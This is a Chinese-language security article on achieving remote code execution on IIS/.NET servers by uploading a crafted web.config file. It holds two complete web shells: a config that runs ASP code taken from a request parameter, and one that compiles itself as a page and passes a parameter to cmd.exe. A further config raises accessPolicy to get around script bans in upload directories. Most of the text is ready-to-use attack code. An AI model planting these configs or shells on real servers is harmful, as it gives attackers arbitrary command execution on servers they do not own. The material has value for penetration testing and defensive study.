

# .NET 上传web.config文件实现RCE思路 - 先知社区

.NET 上传web.config文件实现RCE思路

- - -

# 0x01 作为ASP脚本运行

当某些运行.NET环境的IIS容器也支持托管 ASP 脚本时，有的场景可能会遇到无法直接上传扩展名为 .ASP 的文件，在这种情况下可以通过上传定制化的 web.config文件来运行经典 ASP 脚本代码。0x01 作为ASP脚本运行

```plain
<system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
<!--
<%
Response.write("-"&"->")
Response.write(1+2)
on error resume next
if execute(request("dotnet")) <>"" then execute(request("dotnet"))
Response.write("<!-"&"-")
%>
-->
```

访问 /web.config?dotnet=response.write(now())，页面返回当前日期信息，证明脚本运行成功。如下图所示

[![](assets/1705981862-f6f271ebf17898f995b301505ee42e94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240123111042-fe4a85cc-b99c-1.png)

# 0x02 作为.NETT脚本运行

当Internet Information Service服务器不支持ASP脚本，仅支持.NET运行环境时，有些漏洞场景可能会遇到无法上传ashx、aspx、asmx、soap等扩展名时，可以尝试通过上传定制化的 web.config文件来运行.NET代码

```plain
<system.web>
    <compilation defaultLanguage="cs">
      <buildProviders>
        <add extension=".config" type="System.Web.Compilation.PageBuildProvider" />
      </buildProviders>
    </compilation>
    <httpHandlers>
      <add path="web.config" type="System.Web.UI.PageHandlerFactory" verb="*" />
    </httpHandlers>
  </system.web>
  if (flag){
   System.Diagnostics.Process process = new System.Diagnostics.Process();
process.StartInfo.FileName = "cmd.exe";
  string str = httpContext.Request["c"];
  process.StartInfo.Arguments = "/c " + str;
  process.StartInfo.RedirectStandardOutput = true;
  process.StartInfo.RedirectStandardError = true;
  process.StartInfo.UseShellExecute = false;
  process.Start();
  string str2 = process.StandardOutput.ReadToEnd();
  httpContext.Response.Write("<pre>" + str2 + "</pre>");
  httpContext.Response.Flush();
  httpContext.Response.End();
}
```

访问 /web.config，传入参数c=tasklist，页面返回当前所有的系统进程，脚本运行成功。如下图所示

[![](assets/1705981862-a0e2908af0e5941822c4c79bea8d8b16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240123111054-053ffd76-b99d-1.png)

# 0x03 绕过策略限制

web.config文件可用于配置IIS服务器的运行行为，实战中某些上传目录被管理员设定为禁止运行脚本，并且只提供读取操作，不具备修改和写入权限，比如对uploads目录下的web.config文件配置如下清单

```plain
<system.webServer>
    <handlers accessPolicy="Read,Write">
    </handlers>
</system.webServer>
```

请求/uploads/Shell2asmx.soap如下图所示

[![](assets/1705981862-6d8faeb168fb459f9fd86abfa4511644.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240123111101-0988098c-b99d-1.png)

但此时修改accessPolicy策略，添加写入、执行、运行脚本权限。即accessPolicy="Read,Write,Execute,Script"，再向uploads目录下上传新配置的这个web.config，如下图所示

[![](assets/1705981862-ba7648edbe25a583bce4e31ec0c1a532.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240123111107-0cf90fe4-b99d-1.png)
